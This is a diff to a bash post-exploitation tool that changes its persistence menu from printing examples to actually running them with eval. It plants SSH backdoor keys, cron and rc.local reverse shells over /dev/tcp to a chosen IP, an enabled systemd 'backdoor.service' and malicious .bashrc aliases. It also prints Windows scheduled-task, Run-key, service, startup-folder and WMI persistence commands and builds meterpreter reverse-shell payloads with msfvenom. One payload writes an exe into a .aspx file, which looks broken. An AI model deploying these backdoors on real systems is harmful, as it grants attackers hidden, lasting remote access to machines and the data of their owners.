@@ -13,7 +13,7 @@
 #                                                                           #
 #############################################################################
 
-set -e
+set -euo pipefail
 
 RED='\033[0;31m'
 GREEN='\033[0;32m'
@@ -91,57 +91,226 @@ EOF
 handle_selection() {
     local choice="$1"
     shift
-    
+
+    run_cmd() {
+        local cmd="$1"
+        echo -e "${GREEN}[>] Running: ${cmd}${NC}"
+        eval "$cmd"
+    }
+
     case "$choice" in
         P1|p1)
-            log_info "SSH Backdoor Keys"
-            echo "mkdir -p ~/.ssh"
-            echo "echo 'ssh-rsa AAAAB3NzaC1yc2EAAA...' >> ~/.ssh/authorized_keys"
+            echo -e "${BLUE}[*] SSH Backdoor Keys${NC}"
+            echo ""
+            echo -n "[*] Enter public key (or press Enter to generate example): "
+            read SSH_KEY
+            echo ""
+            if [[ -n "$SSH_KEY" ]]; then
+                run_cmd "mkdir -p ~/.ssh"
+                run_cmd "chmod 700 ~/.ssh"
+                run_cmd "echo '${SSH_KEY}' >> ~/.ssh/authorized_keys"
+                run_cmd "chmod 600 ~/.ssh/authorized_keys"
+            else
+                echo "[*] Example command:"
+                echo "mkdir -p ~/.ssh"
+                echo "echo 'ssh-rsa AAAAB3NzaC1yc2EAAA...' >> ~/.ssh/authorized_keys"
+            fi
             ;;
         P2|p2)
-            log_info "Cron Job Persistence"
-            echo "* * * * * /bin/bash -c '/bin/bash -i >& /dev/tcp/<IP>/<PORT> 0>&1 &'"
-            echo "(crontab -l ; echo '@reboot /path/to/backdoor') | crontab -"
+            echo -e "${BLUE}[*] Cron Job Persistence${NC}"
+            echo ""
+            echo -n "[*] Enter reverse shell IP: "
+            read IP
+            echo -n "[*] Enter port: "
+            read PORT
+            echo -n "[*] Enter command or path to backdoor: "
+            read BACKDOOR
+            echo ""
+            if [[ -n "$IP" && -n "$PORT" ]]; then
+                BACKDOOR=${BACKDOOR:-"/bin/bash -c '/bin/bash -i >& /dev/tcp/${IP}/${PORT} 0>&1 &'"}
+                echo "[*] Adding cron job..."
+                run_cmd "(crontab -l 2>/dev/null; echo '*/5 * * * * ${BACKDOOR}') | crontab -"
+            else
+                echo "[*] Example cron entries:"
+                echo "*/5 * * * * /bin/bash -c '/bin/bash -i >& /dev/tcp/${IP:-<IP>}/${PORT:-<PORT>} 0>&1 &'"
+                echo "@reboot /path/to/backdoor"
+            fi
             ;;
         P3|p3)
-            log_info "Systemd Service"
-            echo "[Unit]"
-            echo "Description=Service"
-            echo "[Service]"
-            echo "Type=oneshot"
-            echo "ExecStart=/path/to/backdoor"
-            echo "[Install]"
-            echo "WantedBy=multi-user.target"
+            echo -e "${BLUE}[*] Systemd Service Persistence${NC}"
+            echo ""
+            echo "[*] Creating systemd service..."
+            echo -n "[*] Enter backdoor path: "
+            read BACKDOOR
+            echo ""
+            if [[ -n "$BACKDOOR" ]]; then
+                run_cmd "cat > /etc/systemd/system/backdoor.service << 'EOF'
+[Unit]
+Description=System Service
+After=network.target
+
+[Service]
+Type=oneshot
+ExecStart=${BACKDOOR}
+RemainAfterExit=yes
+
+[Install]
+WantedBy=multi-user.target
+EOF"
+                run_cmd "systemctl daemon-reload"
+                run_cmd "systemctl enable backdoor.service"
+                echo -e "${GREEN}[>] Service created and enabled${NC}"
+            else
+                echo "[*] Example service file path: /etc/systemd/system/backdoor.service"
+            fi
             ;;
         P4|p4)
-            log_info "rc.local Persistence"
-            echo "/bin/bash -c '/bin/bash -i >& /dev/tcp/<IP>/<PORT> 0>&1 &'"
+            echo -e "${BLUE}[*] rc.local Persistence${NC}"
+            echo ""
+            echo -n "[*] Enter reverse shell IP: "
+            read IP
+            echo -n "[*] Enter port: "
+            read PORT
+            echo ""
+            if [[ -n "$IP" && -n "$PORT" ]]; then
+                BACKDOOR="/bin/bash -c '/bin/bash -i >& /dev/tcp/${IP}/${PORT} 0>&1 &'"
+                run_cmd "echo '${BACKDOOR}' >> /etc/rc.local"
+                echo -e "${GREEN}[>] Added to /etc/rc.local${NC}"
+            else
+                echo "[*] Example entry in /etc/rc.local:"
+                echo "/bin/bash -c '/bin/bash -i >& /dev/tcp/<IP>/<PORT> 0>&1 &'"
+            fi
             ;;
         P5|p5)
-            log_info ".bashrc Backdoor"
-            echo "alias ssh='ssh -o PreferredAuthentications=password -o StrictHostKeyChecking=no'"
-            echo "alias sudo='sudo -i'"
+            echo -e "${BLUE}[*] .bashrc Backdoor${NC}"
+            echo ""
+            echo "[*] Adding aliases to .bashrc..."
+            echo -n "[*] Enter malicious alias command: "
+            read ALIAS_CMD
+            echo ""
+            if [[ -n "$ALIAS_CMD" ]]; then
+                run_cmd "echo \"alias '${ALIAS_CMD}'\" >> ~/.bashrc"
+            else
+                echo "[*] Example malicious aliases:"
+                echo "alias ssh='ssh -o PreferredAuthentications=password -o StrictHostKeyChecking=no'"
+                echo "alias sudo='sudo -i'"
+            fi
             ;;
         PW1)
-            log_info "Windows Scheduled Task"
-            echo "schtasks /create /sc minute /mo 1 /tn \"MyTask\" /tr \"C:\\path\\to\\backdoor.exe\""
+            echo -e "${BLUE}[*] Windows Scheduled Task${NC}"
+            echo ""
+            echo -n "[*] Enter task name: "
+            read TASK_NAME
+            echo -n "[*] Enter backdoor path: "
+            read BACKDOOR
+            echo ""
+            if [[ -n "$TASK_NAME" && -n "$BACKDOOR" ]]; then
+                echo "[>] Creating scheduled task..."
+                echo "schtasks /create /sc minute /mo 1 /tn \"${TASK_NAME}\" /tr \"${BACKDOOR}\" /f"
+            else
+                echo "[*] Example:"
+                echo "schtasks /create /sc minute /mo 1 /tn \"Update\" /tr \"C:\\temp\\backdoor.exe\" /f"
+            fi
             ;;
         PW2)
-            log_info "Windows Registry Run Keys"
-            echo "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"MyBackdoor\" /t REG_SZ /d \"C:\\path\\to\\backdoor.exe\" /f"
+            echo -e "${BLUE}[*] Windows Registry Run Keys${NC}"
+            echo ""
+            echo -n "[*] Enter value name: "
+            read VALUE_NAME
+            echo -n "[*] Enter backdoor path: "
+            read BACKDOOR
+            echo ""
+            if [[ -n "$VALUE_NAME" && -n "$BACKDOOR" ]]; then
+                echo "[>] Adding registry run key..."
+                echo "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"${VALUE_NAME}\" /t REG_SZ /d \"${BACKDOOR}\" /f"
+            else
+                echo "[*] Example:"
+                echo "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"MyBackdoor\" /t REG_SZ /d \"C:\\temp\\backdoor.exe\" /f"
+            fi
             ;;
         PW3)
-            log_info "Windows Service Installation"
-            echo "sc create MyService binPath= \"C:\\path\\to\\backdoor.exe\" start= auto"
-            echo "sc start MyService"
+            echo -e "${BLUE}[*] Windows Service Installation${NC}"
+            echo ""
+            echo -n "[*] Enter service name: "
+            read SERVICE_NAME
+            echo -n "[*] Enter backdoor path: "
+            read BACKDOOR
+            echo ""
+            if [[ -n "$SERVICE_NAME" && -n "$BACKDOOR" ]]; then
+                echo "[>] Creating service..."
+                echo "sc create ${SERVICE_NAME} binPath= \"${BACKDOOR}\" start= auto"
+                echo "sc start ${SERVICE_NAME}"
+            else
+                echo "[*] Example:"
+                echo "sc create MyService binPath= \"C:\\temp\\backdoor.exe\" start= auto"
+                echo "sc start MyService"
+            fi
             ;;
         PW4)
-            log_info "Windows Startup Folder"
-            echo "copy backdoor.exe \"C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\\""
+            echo -e "${BLUE}[*] Windows Startup Folder${NC}"
+            echo ""
+            echo -n "[*] Enter backdoor path: "
+            read BACKDOOR
+            echo ""
+            if [[ -n "$BACKDOOR" ]]; then
+                echo "[>] Copying to startup folder..."
+                echo "copy ${BACKDOOR} \"C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\\""
+            else
+                echo "[*] Example:"
+                echo "copy C:\\temp\\backdoor.exe \"C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\\""
+            fi
+            ;;
+        PW5)
+            echo -e "${BLUE}[*] WMI Event Subscription${NC}"
+            echo ""
+            echo "[*] WMI Event Subscription requires PowerShell scripting."
+            echo "Example PowerShell command:"
+            echo '$filter = "__EventFilter", "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA \"Win32_Process\" AND TargetInstance.Name = \"notepad.exe\""'
+            echo '$consumer = "CommandLineEventConsumer", @{CommandLineTemplate = "C:\\temp\\backdoor.exe"}'
+            echo '$binding = "__FilterToConsumerBinding", @{Filter = $filter; Consumer = $consumer}'
+            echo ""
+            echo -n "[*] Press Enter to continue... "
+            read
             ;;
         PWS1)
-            log_info "PHP Web Shell"
-            echo "msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=443 -f raw > shell.php"
+            echo -e "${BLUE}[*] PHP Web Shell Generator${NC}"
+            echo ""
+            echo -n "[*] Enter LHOST: "
+            read LHOST
+            echo -n "[*] Enter LPORT: "
+            read LPORT
+            echo ""
+            if [[ -n "$LHOST" && -n "$LPORT" ]]; then
+                if command -v msfvenom &>/dev/null; then
+                    run_cmd "msfvenom -p php/meterpreter_reverse_tcp LHOST=${LHOST} LPORT=${LPORT} -f raw > shell.php"
+                    echo -e "${GREEN}[>] Web shell saved to: shell.php${NC}"
+                else
+                    echo -e "${YELLOW}[!] msfvenom not found${NC}"
+                fi
+            else
+                echo "[*] Example:"
+                echo "msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=443 -f raw > shell.php"
+            fi
+            ;;
+        PWS2)
+            echo -e "${BLUE}[*] ASP Web Shell Generator${NC}"
+            echo ""
+            echo -n "[*] Enter LHOST: "
+            read LHOST
+            echo -n "[*] Enter LPORT: "
+            read LPORT
+            echo ""
+            if [[ -n "$LHOST" && -n "$LPORT" ]]; then
+                if command -v msfvenom &>/dev/null; then
+                    run_cmd "msfvenom -p windows/meterpreter/reverse_tcp LHOST=${LHOST} LPORT=${LPORT} -f exe > shell.aspx"
+                    echo -e "${GREEN}[>] Web shell saved to: shell.aspx${NC}"
+                else
+                    echo -e "${YELLOW}[!] msfvenom not found${NC}"
+                fi
+            else
+                echo "[*] Example:"
+                echo "msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=443 -f exe > shell.aspx"
+            fi
             ;;
         --menu)
             banner
